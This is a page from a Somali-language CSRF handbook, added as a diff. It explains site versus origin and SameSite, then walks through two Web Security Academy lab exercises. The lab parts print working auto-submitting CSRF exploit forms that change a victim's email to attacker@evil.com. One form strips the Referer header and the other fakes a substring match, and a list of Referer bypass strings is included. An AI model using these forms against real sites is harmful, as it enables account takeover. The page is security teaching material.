@@ -1,0 +1,530 @@
+<!doctype html>
+<html lang="so" data-theme="dark" class="no-js">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="CSRF Handbook - buug-gacmeedka CSRF oo af-Soomaali ah.">
+<title>QAYBTA VII SAMESITE, WEBSOCKET, IYO BEYOND - CSRF Handbook</title>
+<link rel="icon" href="../assets/img/favicon.svg" type="image/svg+xml">
+<meta name="color-scheme" content="dark light">
+<script>
+(function () {
+  try {
+    var t = localStorage.getItem('csrf-theme');
+    if (!t) t = window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark';
+    document.documentElement.setAttribute('data-theme', t);
+  } catch (e) {}
+  document.documentElement.classList.remove('no-js');
+  window.addEventListener('load', function () {
+    setTimeout(function () {
+      if (!window.__csrfAnim) document.documentElement.classList.add('no-js');
+    }, 1500);
+  });
+})();
+</script>
+<link rel="stylesheet" href="../assets/vendor/bootstrap/bootstrap.min.css">
+<link rel="stylesheet" href="../assets/css/themes.css">
+<link rel="stylesheet" href="../assets/css/style.css">
+<link rel="stylesheet" href="../assets/css/premium.css">
+<link rel="stylesheet" href="../assets/css/responsive.css">
+</head>
+<body data-chapterdir="" data-current="part-7">
+<a class="skip-link" href="#main">U gudub nuxurka</a>
+<div class="reading-progress" aria-hidden="true"><span id="reading-progress-bar"></span></div>
+<header class="site-header">
+  <button class="icon-btn" id="menu-toggle" type="button" aria-label="Fur liiska qaybaha" aria-expanded="false" aria-controls="sidebar">
+    <svg viewBox="0 0 24 24" width="20" height="20" aria-hidden="true"><path d="M3 6h18M3 12h18M3 18h18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
+  </button>
+  <a class="brand" href="../index.html">
+    <span class="brand__mark" aria-hidden="true">
+      <svg viewBox="0 0 32 32" width="26" height="26">
+        <path d="M16 2l11 5v9c0 7-4.7 12.4-11 14C9.7 28.4 5 23 5 16V7z" fill="none" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/>
+        <path d="M11 16l3.5 3.5L21 12" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </span>
+    <span class="brand__text"><strong>CSRF</strong> Handbook</span>
+  </a>
+  <div class="header-actions">
+    <button class="search-btn" id="search-open" type="button" aria-label="Raadi buugga">
+      <svg viewBox="0 0 24 24" width="16" height="16" aria-hidden="true"><circle cx="11" cy="11" r="7" fill="none" stroke="currentColor" stroke-width="2"/><path d="M20 20l-3.5-3.5" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
+      <span class="search-btn__text">Raadi</span>
+      <kbd class="search-btn__kbd">/</kbd>
+    </button>
+    <button class="icon-btn" id="toc-toggle" type="button" aria-label="Fur liiska boggan" aria-expanded="false" aria-controls="onthispage">
+      <svg viewBox="0 0 24 24" width="20" height="20" aria-hidden="true"><path d="M8 6h13M8 12h13M8 18h13M3 6h.01M3 12h.01M3 18h.01" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
+    </button>
+    <button class="icon-btn theme-toggle" id="theme-toggle" type="button" aria-label="Beddel mawduuca" aria-pressed="false">
+      <svg class="icon-moon" viewBox="0 0 24 24" width="18" height="18" aria-hidden="true"><path d="M21 12.8A9 9 0 1111.2 3a7 7 0 009.8 9.8z" fill="none" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/></svg>
+      <svg class="icon-sun" viewBox="0 0 24 24" width="18" height="18" aria-hidden="true"><circle cx="12" cy="12" r="4.5" fill="none" stroke="currentColor" stroke-width="2"/><path d="M12 2v3M12 19v3M2 12h3M19 12h3M4.9 4.9l2.1 2.1M17 17l2.1 2.1M19.1 4.9L17 7M7 17l-2.1 2.1" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
+    </button>
+  </div>
+</header>
+<div class="layout">
+  <aside class="sidebar" id="sidebar" aria-label="Liiska qaybaha">
+    <div class="sidebar__inner">
+<nav class="toc" aria-label="Handbook contents">
+<p class="toc__title">Buugga oo dhan</p>
+<ol class="toc__parts">
+<li class="toc__part">
+<div class="toc__part-row">
+<a class="toc__part-link" href="part-intro.html">HORDHAC BUUGGA</a>
+</div>
+</li>
+<li class="toc__part">
+<div class="toc__part-row">
+<a class="toc__part-link" href="part-1.html">QAYBTA I — FALSAFADDA CSRF</a>
+<button class="toc__toggle" type="button" aria-expanded="false" aria-label="Toggle sections"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path d="M6 9l6 6 6-6" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+</div>
+<ol class="toc__sections">
+<li class="toc__section"><a href="part-1.html#part-1-b5">HTTP iyo Statelessness:</a></li>
+<li class="toc__section"><a href="part-1.html#part-1-b12">Dhibaatada</a></li>
+<li class="toc__section"><a href="part-1.html#part-1-b26">Mental Model</a></li>
+<li class="toc__section"><a href="part-1.html#part-1-b28">Model-ka waa sidan:</a></li>
+<li class="toc__section"><a href="part-1.html#part-1-b30">muxuu CSRF u jiraa?</a></li>
+</ol>
+</li>
+<li class="toc__part">
+<div class="toc__part-row">
+<a class="toc__part-link" href="part-2.html">QAYBTA II — HTTP</a>
+<button class="toc__toggle" type="button" aria-expanded="false" aria-label="Toggle sections"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path d="M6 9l6 6 6-6" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+</div>
+<ol class="toc__sections">
+<li class="toc__section"><a href="part-2.html#part-2-b0">HTTP Request: Anatomy</a></li>
+<li class="toc__section toc__section--sub"><a href="part-2.html#part-2-b4">Request Line: POST /login HTTP/1.1</a></li>
+<li class="toc__section toc__section--sub"><a href="part-2.html#part-2-b9">Host Header: Host: target.com</a></li>
+<li class="toc__section toc__section--sub"><a href="part-2.html#part-2-b12">Cookie Header: Cookie: session=ABC123</a></li>
+<li class="toc__section toc__section--sub"><a href="part-2.html#part-2-b14">Referer Header: Referer: https://target.com/login</a></li>
+<li class="toc__section toc__section--sub"><a href="part-2.html#part-2-b17">2.2.5 Origin Header: Origin: https://target.com</a></li>
+<li class="toc__section toc__section--sub"><a href="part-2.html#part-2-b20">Body: username=wiener&amp;password=peter</a></li>
+<li class="toc__section"><a href="part-2.html#part-2-b23">2.3 HTTP Response: Anatomy</a></li>
+<li class="toc__section toc__section--sub"><a href="part-2.html#part-2-b26">Status Code: 200 OK</a></li>
+<li class="toc__section toc__section--sub"><a href="part-2.html#part-2-b29">Set-Cookie: Set-Cookie: session=ABC123; SameSite=Strict</a></li>
+<li class="toc__section toc__section--sub"><a href="part-2.html#part-2-b34">X-Frame-Options: X-Frame-Options: DENY</a></li>
+<li class="toc__section toc__section--sub"><a href="part-2.html#part-2-b46">Top-Level Navigation vs Subresource</a></li>
+<li class="toc__section toc__section--sub"><a href="part-2.html#part-2-b53">2.4.4 Default SameSite</a></li>
+<li class="toc__section"><a href="part-2.html#part-2-b56">Headers: Trust Boundaries</a></li>
+<li class="toc__section toc__section--sub"><a href="part-2.html#part-2-b58">2.5.1 Browser-Controlled Headers</a></li>
+<li class="toc__section toc__section--sub"><a href="part-2.html#part-2-b60">Attacker-Controlled Headers</a></li>
+<li class="toc__section"><a href="part-2.html#part-2-b62">HTTP/2 iyo HTTP/3: Mustaqbalka</a></li>
+</ol>
+</li>
+<li class="toc__part">
+<div class="toc__part-row">
+<a class="toc__part-link" href="part-3.html">QAYBTA III  ANATOMY OF CSRF</a>
+<button class="toc__toggle" type="button" aria-expanded="false" aria-label="Toggle sections"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path d="M6 9l6 6 6-6" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+</div>
+<ol class="toc__sections">
+<li class="toc__section"><a href="part-3.html#part-3-b1">Shuruudaha CSRF: Afarta Tiir</a></li>
+<li class="toc__section toc__section--sub"><a href="part-3.html#part-3-b3">Tiirka 1: Action-ka Waa In Uu Beddelaa State</a></li>
+<li class="toc__section toc__section--sub"><a href="part-3.html#part-3-b9">Tiirka 2: Authentication Waa Cookie-Based</a></li>
+<li class="toc__section toc__section--sub"><a href="part-3.html#part-3-b15">Tiirka 3: Ma Jiro Token Sir Ah (Ama Waa La Jabin Karaa)</a></li>
+<li class="toc__section toc__section--sub"><a href="part-3.html#part-3-b21">Tiirka 4: Browser-ku Wuxuu Diri Karaa Request-ka</a></li>
+<li class="toc__section"><a href="part-3.html#part-3-b27">Noocyada CSRF</a></li>
+<li class="toc__section toc__section--sub"><a href="part-3.html#part-3-b29">GET-Based CSRF</a></li>
+<li class="toc__section toc__section--sub"><a href="part-3.html#part-3-b36">POST-Based CSRF</a></li>
+<li class="toc__section toc__section--sub"><a href="part-3.html#part-3-b42">WebSocket CSRF (CSWSH)</a></li>
+<li class="toc__section toc__section--sub"><a href="part-3.html#part-3-b49">JSON-Based CSRF</a></li>
+<li class="toc__section toc__section--sub"><a href="part-3.html#part-3-b56">Clickjacking + CSRF</a></li>
+<li class="toc__section"><a href="part-3.html#part-3-b62">Sida Loo Helo CSRF</a></li>
+<li class="toc__section toc__section--sub"><a href="part-3.html#part-3-b64">Tallaabo 1: Hel Dhammaan Actions-ka State-Changing</a></li>
+<li class="toc__section toc__section--sub"><a href="part-3.html#part-3-b68">Tallaabo 2: Falanqee Request-ka: Waa in la falanqeeyaa request-ka. Waa in la ogaado qayb kasta.</a></li>
+<li class="toc__section toc__section--sub"><a href="part-3.html#part-3-b71">Tallaabo 3: Tijaabi Defenses</a></li>
+<li class="toc__section toc__section--sub"><a href="part-3.html#part-3-b76">Tallaabo 4: Isku Day Bypass</a></li>
+<li class="toc__section"><a href="part-3.html#part-3-b80">Fikirka Developer-ka: Sida Looga Hortago CSRF</a></li>
+<li class="toc__section"><a href="part-3.html#part-3-b89">MUXUU Developer-ku u Illoobaa CSRF?</a></li>
+</ol>
+</li>
+<li class="toc__part">
+<div class="toc__part-row">
+<a class="toc__part-link" href="part-4.html">QAYBTA IV  DEFENSES</a>
+<button class="toc__toggle" type="button" aria-expanded="false" aria-label="Toggle sections"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path d="M6 9l6 6 6-6" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+</div>
+<ol class="toc__sections">
+<li class="toc__section"><a href="part-4.html#part-4-b3">CSRF Token</a></li>
+<li class="toc__section toc__section--sub"><a href="part-4.html#part-4-b9">Noocyada CSRF Token</a></li>
+<li class="toc__section toc__section--sub"><a href="part-4.html#part-4-b21">4.2.3 Sida Loo Jebiyo CSRF Token</a></li>
+<li class="toc__section"><a href="part-4.html#part-4-b25">SameSite: Falsafadda Xaddidaadda</a></li>
+<li class="toc__section toc__section--sub"><a href="part-4.html#part-4-b38">4.3.2 Sida Loo Jebiyo SameSite</a></li>
+<li class="toc__section"><a href="part-4.html#part-4-b41">4.4 Origin/Referer Validation: Falsafadda Xaqiijinta</a></li>
+<li class="toc__section toc__section--sub"><a href="part-4.html#part-4-b42">4.4.1</a></li>
+<li class="toc__section toc__section--sub"><a href="part-4.html#part-4-b49">Sida Loo Jebiyo Origin/Referer</a></li>
+<li class="toc__section"><a href="part-4.html#part-4-b57">Custom Headers:  X-Requested-With</a></li>
+<li class="toc__section"><a href="part-4.html#part-4-b63">Defense-in-Depth</a></li>
+</ol>
+</li>
+<li class="toc__part">
+<div class="toc__part-row">
+<a class="toc__part-link" href="part-5.html">QAYBTA V — BILOW: LABS-KA FUDUD</a>
+<button class="toc__toggle" type="button" aria-expanded="false" aria-label="Toggle sections"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path d="M6 9l6 6 6-6" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+</div>
+<ol class="toc__sections">
+<li class="toc__section"><a href="part-5.html#part-5-b4">Lab-ka 1: No Defenses</a></li>
+<li class="toc__section toc__section--sub"><a href="part-5.html#part-5-b19">Tijaabinta</a></li>
+<li class="toc__section"><a href="part-5.html#part-5-b37">Lab-ka 2: Method Override</a></li>
+<li class="toc__section toc__section--sub"><a href="part-5.html#part-5-b38">Fikradda Lab-kan</a></li>
+<li class="toc__section toc__section--sub"><a href="part-5.html#part-5-b41">Falsafadda Method-ka</a></li>
+<li class="toc__section toc__section--sub"><a href="part-5.html#part-5-b47">Sida Loo Tijaabiyo</a></li>
+<li class="toc__section"><a href="part-5.html#part-5-b60">Lab-ka 3: Token Presence</a></li>
+<li class="toc__section toc__section--sub"><a href="part-5.html#part-5-b66">tijaabinta</a></li>
+</ol>
+</li>
+<li class="toc__part">
+<div class="toc__part-row">
+<a class="toc__part-link" href="part-6.html">QAYBTA VI — DHEXDHEXAAD BYPASSES</a>
+<button class="toc__toggle" type="button" aria-expanded="false" aria-label="Toggle sections"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path d="M6 9l6 6 6-6" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+</div>
+<ol class="toc__sections">
+<li class="toc__section"><a href="part-6.html#part-6-b6">Lab-ka : Token Not Tied to Session</a></li>
+<li class="toc__section toc__section--sub"><a href="part-6.html#part-6-b22">Aan tijaabino</a></li>
+<li class="toc__section"><a href="part-6.html#part-6-b33">Lab-ka 5: Token Tied to Non-Session Cookie</a></li>
+<li class="toc__section toc__section--sub"><a href="part-6.html#part-6-b45">Marka Qoraalku Noqdo Code</a></li>
+<li class="toc__section toc__section--sub"><a href="part-6.html#part-6-b52">Sida Loo Tijaabiyo</a></li>
+<li class="toc__section"><a href="part-6.html#part-6-b65">Lab-ka 6: Token Duplicated in Cookie</a></li>
+<li class="toc__section toc__section--sub"><a href="part-6.html#part-6-b68">6.4.2 Falsafadda Double Submit</a></li>
+<li class="toc__section toc__section--sub"><a href="part-6.html#part-6-b79">6.4.4 Sida Loo Tijaabiyo</a></li>
+<li class="toc__section"><a href="part-6.html#part-6-b90">CRLF:</a></li>
+<li class="toc__section toc__section--sub"><a href="part-6.html#part-6-b97">Headers</a></li>
+</ol>
+</li>
+<li class="toc__part is-active">
+<div class="toc__part-row">
+<a class="toc__part-link" href="part-7.html">QAYBTA VII SAMESITE, WEBSOCKET, IYO BEYOND</a>
+<button class="toc__toggle" type="button" aria-expanded="false" aria-label="Toggle sections"><svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path d="M6 9l6 6 6-6" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+</div>
+<ol class="toc__sections">
+<li class="toc__section"><a href="part-7.html#part-7-b9">Site vs Origin</a></li>
+<li class="toc__section toc__section--sub"><a href="part-7.html#part-7-b10">Fikradda Aasaasiga ah</a></li>
+<li class="toc__section toc__section--sub"><a href="part-7.html#part-7-b20">Site</a></li>
+<li class="toc__section"><a href="part-7.html#part-7-b29">Lab-ka 7: Referer Validation Depends on Header Being Present</a></li>
+<li class="toc__section toc__section--sub"><a href="part-7.html#part-7-b31">Referer</a></li>
+<li class="toc__section toc__section--sub"><a href="part-7.html#part-7-b34">Sida Loo Tijaabiyo</a></li>
+<li class="toc__section"><a href="part-7.html#part-7-b45">Lab-ka 8: Broken Referer Validation</a></li>
+<li class="toc__section toc__section--sub"><a href="part-7.html#part-7-b47">Substring</a></li>
+<li class="toc__section toc__section--sub"><a href="part-7.html#part-7-b51">Falsafadda Contains vs Equals</a></li>
+<li class="toc__section"><a href="part-7.html#part-7-b68">Lab-ka 9: SameSite Lax via Method Override</a></li>
+<li class="toc__section toc__section--sub"><a href="part-7.html#part-7-b70">Top-Level Navigation</a></li>
+<li class="toc__section toc__section--sub"><a href="part-7.html#part-7-b75">Method Override</a></li>
+<li class="toc__section toc__section--sub"><a href="part-7.html#part-7-b82">Sida Loo Tijaabiyo</a></li>
+<li class="toc__section"><a href="part-7.html#part-7-b93">Lab-ka 10: SameSite Strict via Client-Side Redirect —</a></li>
+<li class="toc__section toc__section--sub"><a href="part-7.html#part-7-b96">Gadget-ka</a></li>
+<li class="toc__section toc__section--sub"><a href="part-7.html#part-7-b101">Client-Side Redirect</a></li>
+<li class="toc__section toc__section--sub"><a href="part-7.html#part-7-b109">Sida Loo Tijaabiyo</a></li>
+<li class="toc__section"><a href="part-7.html#part-7-b122">Lab-ka 11: SameSite Strict via Sibling Domain (CSWSH)</a></li>
+<li class="toc__section toc__section--sub"><a href="part-7.html#part-7-b128">XSS on Sibling Domain</a></li>
+<li class="toc__section toc__section--sub"><a href="part-7.html#part-7-b132">CSWSH</a></li>
+<li class="toc__section toc__section--sub"><a href="part-7.html#part-7-b136">7.7.5 Sida Loo Tijaabiyo</a></li>
+<li class="toc__section"><a href="part-7.html#part-7-b149">Lab-ka 12: SameSite Lax via Cookie Refresh</a></li>
+<li class="toc__section toc__section--sub"><a href="part-7.html#part-7-b151">Cookie Refresh</a></li>
+<li class="toc__section toc__section--sub"><a href="part-7.html#part-7-b157">7.8.4 Sida Loo Tijaabiyo</a></li>
+<li class="toc__section"><a href="part-7.html#part-7-b169">7.9 Falsafadda SameSite: Soo Koobid</a></li>
+<li class="toc__section toc__section--sub"><a href="part-7.html#part-7-b170">7.9.1 Saddexda Qiime</a></li>
+</ol>
+</li>
+</ol>
+</nav>
+    </div>
+  </aside>
+  <div class="sidebar-scrim" id="sidebar-scrim" hidden></div>
+  <main class="content" id="main">
+<nav class="breadcrumb" aria-label="Breadcrumb"><a href="../index.html">Bogga Hore</a><span aria-hidden="true">/</span><span aria-current="page">QAYBTA VII SAMESITE, WEBSOCKET, IYO BEYOND</span></nav>
+<header class="chapter-hero reveal-hero" data-accent="part-7"><div class="chapter-hero__text"><p class="chapter-hero__eyebrow">QAYBTA VII</p><h1 class="chapter-hero__title">QAYBTA VII SAMESITE, WEBSOCKET, IYO BEYOND</h1><ul class="chapter-hero__meta"><li class="chip"><svg viewBox="0 0 24 24" width="13" height="13" aria-hidden="true"><path d="M4 6h16M4 12h16M4 18h10" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg> <b>26</b> qaybood</li><li class="chip"><svg viewBox="0 0 24 24" width="13" height="13" aria-hidden="true"><path d="M9 8l-4 4 4 4M15 8l4 4-4 4" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg> <b>13</b> tusaale</li><li class="chip"><svg viewBox="0 0 24 24" width="13" height="13" aria-hidden="true"><rect x="4" y="5" width="16" height="14" rx="2" fill="none" stroke="currentColor" stroke-width="2"/><path d="M4 10h16M10 10v9" stroke="currentColor" stroke-width="2"/></svg> <b>1</b> jadwal</li></ul></div><div class="chapter-hero__art"><svg viewBox="0 0 200 200" role="img" aria-hidden="true" focusable="false"><circle cx="100" cy="100" r="80" class="emblem-ring-a spin-slow" fill="none" stroke-width="1.5" stroke-dasharray="4 10"/><circle cx="100" cy="100" r="62" class="emblem-ring-b spin-rev" fill="none" stroke-width="2.5" stroke-dasharray="30 16" opacity=".7"/><circle cx="100" cy="100" r="72" class="emblem-ring-c" fill="none" stroke-width="1" opacity=".25"/><g class="emblem-core"><circle cx="66" cy="132" r="12" fill="none" stroke="currentColor" stroke-width="3"/><circle cx="134" cy="132" r="12" fill="none" stroke="currentColor" stroke-width="3"/><circle cx="100" cy="70" r="12" fill="none" stroke="currentColor" stroke-width="3"/><path d="M74 122l18-38M126 122l-18-38" stroke="currentColor" stroke-width="3" stroke-linecap="round"/><path d="M78 132h44" stroke="currentColor" stroke-width="3" stroke-linecap="round"/></g></svg></div></header>
+<p id="part-7-b0" data-reveal>Waxaa jira dhibaato falsafadeed oo ku jirta web-ka. Dhibaatadu waa xuduudaha. Waa boundaries. Waa meesha wax kala go'aan.</p>
+<p id="part-7-b1" data-reveal>Aan tusaale ku siiyo. Waa maxay "website"?</p>
+<p id="part-7-b2" data-reveal>Jawaabta fudud: Waa <code>example.com</code>.</p>
+<p id="part-7-b3" data-reveal>Jawaabta dheer : Waa <code>example.com</code>, <code>www.example.com</code>, <code>cms.example.com</code>, <code>api.example.com</code>, iyo <code>example.co.uk</code> Waa qaybo badan. Waa xuduudo aan caddayn.</p>
+<p id="part-7-b4" data-reveal>Web-ku wuxuu leeyahay xuduudo aan la qeexin. Waa fuzzy boundaries. Waa overlapping boundaries. Waa nested boundaries.</p>
+<p id="part-7-b5" data-reveal>Tani waa dhibaatada SameSite. SameSite wuxuu ku salaysan yahay "site". Laakiin "site" ma aha "origin". Waa mid ka weyn. Waa mid ka duwan.</p>
+<p id="part-7-b6" data-reveal>Tani waa dhibaatada WebSocket. WebSocket wuxuu ku salaysan yahay "origin". Laakiin WebSocket handshake-ku ma leh CSRF token. Waa trust boundary oo jaban.</p>
+<p id="part-7-b7" data-reveal>Tani waa dhibaatada sibling domain. Sibling domain waa isla site. Laakiin waa origin kala duwan. XSS on sibling domain wuxuu u ogolaataa attacker inuu same-site requests sameeyo.</p>
+<p id="part-7-b8" data-reveal>Lab-yada sare waxay ku barayaan in xuduudaha aanay caddayn. Waa in aad barato sida loo arko xuduudaha. Waa in aad barato sida loo fahmo xuduudaha. Waa in aad barato sida loo jebiyo xuduudaha.</p>
+<h2 id="part-7-b9" class="section-title" data-reveal>Site vs Origin</h2>
+<h3 id="part-7-b10" class="subsection-title" data-reveal>Fikradda Aasaasiga ah</h3>
+<p id="part-7-b11" data-reveal>Origin waa scheme + host + port. Tusaale:</p>
+<ul class="doc-list" data-reveal><li><code>https://example.com</code> — origin.</li><li><code>https://cms.example.com</code> — origin kale.</li><li><code>http://example.com</code> — origin kale (scheme duwan).</li><li><code>https://example.com:8080</code> — origin kale (port duwan).</li></ul>
+<p id="part-7-b13" data-reveal>Site waa registrable domain (eTLD+1). Tusaale:</p>
+<ul class="doc-list" data-reveal><li><code>example.com</code> — site.</li><li><code>cms.example.com</code> — isla site.</li><li><code>www.example.com</code> — isla site.</li><li><code>example.co.uk</code> — site (eTLD waa <code>co.uk</code>).</li></ul>
+<p id="part-7-b15" data-reveal>Origin waa qayb. Site waa koox. Origin waa local. Site waa global. Labaduba waa trust boundaries laakiin heer kala duwan.</p>
+<p id="part-7-b16" data-reveal>Origin waa aasaaska ee SOP (Same-Origin Policy). SOP wuxuu yiraahdaa:</p>
+<p id="part-7-b17" data-reveal>"JavaScript-ka bogga A ma akhrin karo xogta bogga B haddii origin-yadu kala duwan yihiin."</p>
+<p id="part-7-b18" data-reveal>Origin waa isolation. Waa quarantine. Waa sandbox. Wuxuu u sheegaa browser-ka: "Origin kastaa waa gobol. Ma gudbi karo."</p>
+<p id="part-7-b19" data-reveal>Origin waa trust boundary oo adag. Laakiin ma ilaalinayso CSRF. CSRF wuxuu ku salaysan yahay cookies, ma aha origin. Cookies-ka waa la diraa site-ka, ma aha origin-ka.</p>
+<h3 id="part-7-b20" class="subsection-title" data-reveal> Site</h3>
+<p id="part-7-b21" data-reveal>Site waa aasaas ee SameSite. SameSite wuxuu yiraahdaa:</p>
+<p id="part-7-b22" data-reveal>"Cookie-ga lama diro cross-site. Waa in la diraa same-site."</p>
+<p id="part-7-b23" data-reveal>Site waa koox. Waa family.. Wuxuu u sheegaa browser-ka: "Site kastaa waa qoys. Xubnaha qoyska waa la aqbalayaa."</p>
+<p id="part-7-b24" data-reveal>:</p>
+<ol class="doc-list" data-reveal><li>Sibling domains waa isla site.</li><li>XSS on sibling domain wuxuu u ogolaataa attacker inuu same-site requests sameeyo.</li><li>SameSite=Strict ma ilaalinayso sibling domain XSS.</li></ol>
+<p id="part-7-b26" data-reveal>Gap waa farqiqa u dhexeeya origin iyo site.</p>
+<p id="part-7-b27" data-reveal>Tusaale:</p>
+<ul class="doc-list" data-reveal><li><code>https://cms.example.com</code> iyo <code>https://example.com</code> waa origin kala duwan laakiin isla site.</li><li>SOP wuxuu yiraahdaa: "Kala duwan." SameSite wuxuu yiraahdaa: "Isku mid."</li></ul>
+<h2 id="part-7-b29" class="section-title" data-reveal>Lab-ka 7: Referer Validation Depends on Header Being Present </h2>
+<p id="part-7-b30" data-reveal>Lab-kan wuxuu leeyahay Referer validation oo ku xiran jiritaanka header-ka. Haddii Referer maqan yahay, server-ku wuu aqbalayaa.</p>
+<h3 id="part-7-b31" class="subsection-title" data-reveal>Referer</h3>
+<p id="part-7-b32" data-reveal>Referer waa context. Waa direction. Waa halka. Waa waxa request-ku ka yimid.</p>
+<p id="part-7-b33" data-reveal>Dhibaatada: Referer waa optional. Browser-ku wuu tirtiri karaa. Attacker-ku wuu tirtiri karaa. Marka, maqnaanshaha waa possible.</p>
+<h3 id="part-7-b34" class="subsection-title" data-reveal>Sida Loo Tijaabiyo</h3>
+<p id="part-7-b35" data-reveal>Tallaabo 1: Login wiener</p>
+<ul class="doc-list" data-reveal><li>Eeg request-ka: <code>Referer: https://target.com/my-account</code>.</li></ul>
+<p id="part-7-b37" data-reveal>Tallaabo 2: Tijaabi Referer</p>
+<ul class="doc-list" data-reveal><li>Beddel <code>Referer: https://evil.com</code> → waa la diiday.</li></ul>
+<p id="part-7-b39" data-reveal>Tallaabo 3: Tirtir Referer</p>
+<ul class="doc-list" data-reveal><li>Tirtir <code>Referer</code> header-ka oo dhan.</li><li>Riix Send.</li><li>Haddii la aqbalo → waa vulnerable.</li></ul>
+<p id="part-7-b41" data-reveal>Tallaabo 4: Samee exploit</p>
+<figure class="code-panel" data-reveal><figcaption class="code-panel__head"><span class="code-panel__lang">html</span><span class="code-panel__lines">5 sadar</span><button type="button" class="copy-btn" data-copy aria-label="Copy code to clipboard"><span class="copy-btn__label">Copy</span></button></figcaption><pre class="code-block" tabindex="0"><code class="language-markup">&lt;meta name="referrer" content="no-referrer"&gt;
+&lt;form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email"&gt;
+    &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</code></pre></figure>
+<p id="part-7-b43" data-reveal>Tallaabo 5: Deliver</p>
+<ul class="doc-list" data-reveal><li>Beddel email-ka.</li><li>Store, Deliver.</li></ul>
+<h2 id="part-7-b45" class="section-title" data-reveal>Lab-ka 8: Broken Referer Validation </h2>
+<p id="part-7-b46" data-reveal>Lab-kan wuxuu leeyahay Referer validation oo isticmaala substring match. Wuxuu aqbalayaa <code>Referer: https://evil.com/?target.com</code>.</p>
+<h3 id="part-7-b47" class="subsection-title" data-reveal>Substring</h3>
+<p id="part-7-b48" data-reveal>Substring waa qayb. Waa fragment. Waa piece. Waa wax ka mid ah.</p>
+<p id="part-7-b49" data-reveal>Substring wuxuu yiraahdaa: "Haddii <code>target.com</code> uu ku jiro <code>Referer</code>, waa sax." Laakiin <code>target.com</code> wuxuu ku jiri karaa meel kasta:</p>
+<ul class="doc-list" data-reveal><li><code>https://target.com/</code> — host.</li><li><code>https://evil.com/?target.com</code> — query string.</li><li><code>https://evil.com/#target.com</code> — fragment.</li><li><code>https://target.com.evil.com/</code> — subdomain.</li><li><code>https://evil.com/target.com</code> — path.</li></ul>
+<h3 id="part-7-b51" class="subsection-title" data-reveal>Falsafadda Contains vs Equals</h3>
+<p id="part-7-b52" data-reveal>Contains waa inclusion. Equals waa identity.</p>
+<ul class="doc-list" data-reveal><li><code>Contains</code> wuxuu yiraahdaa: "Waxaa jira qayb."</li><li><code>Equals</code> wuxuu yiraahdaa: "Waa isla mid."</li></ul>
+<p id="part-7-b54" data-reveal>Contains waa weak. Equals waa strong. Marka aad xaqiijinayso identity, waa in la isticmaalaa Equals, ma aha Contains.</p>
+<p id="part-7-b55" data-reveal>Tusaale:</p>
+<figure class="code-panel" data-reveal><figcaption class="code-panel__head"><span class="code-panel__lang">text</span><span class="code-panel__lines">2 sadar</span><button type="button" class="copy-btn" data-copy aria-label="Copy code to clipboard"><span class="copy-btn__label">Copy</span></button></figcaption><pre class="code-block" tabindex="0"><code class="">Contains: "https://evil.com/?target.com" contains "target.com" → TRUE
+Equals:   "https://evil.com/?target.com" == "target.com" → FALSE</code></pre></figure>
+<p id="part-7-b57" data-reveal>Tallaabo 1: Login wiener</p>
+<ul class="doc-list" data-reveal><li>Eeg request-ka: <code>Referer: https://target.com/my-account</code>.</li></ul>
+<p id="part-7-b59" data-reveal>Tallaabo 2: Tijaabi Referer</p>
+<ul class="doc-list" data-reveal><li>Beddel <code>Referer: https://evil.com</code> → waa la diiday.</li></ul>
+<p id="part-7-b61" data-reveal>Tallaabo 3: Tijaabi substring</p>
+<ul class="doc-list" data-reveal><li>Beddel <code>Referer: https://evil.com/?target.com</code> → waa la aqbalay.</li><li>Gunaanad: Substring match.</li></ul>
+<p id="part-7-b63" data-reveal>Tallaabo 4: Samee exploit</p>
+<figure class="code-panel" data-reveal><figcaption class="code-panel__head"><span class="code-panel__lang">html</span><span class="code-panel__lines">14 sadar</span><button type="button" class="copy-btn" data-copy aria-label="Copy code to clipboard"><span class="copy-btn__label">Copy</span></button></figcaption><pre class="code-block" tabindex="0"><code class="language-markup">&lt;html&gt;
+&lt;head&gt;
+    &lt;meta name="referrer" content="unsafe-url"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email"&gt;
+        &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+    &lt;/form&gt;
+    &lt;script&gt;
+        history.pushState("", "", "/?target.com");
+        document.forms[0].submit();
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre></figure>
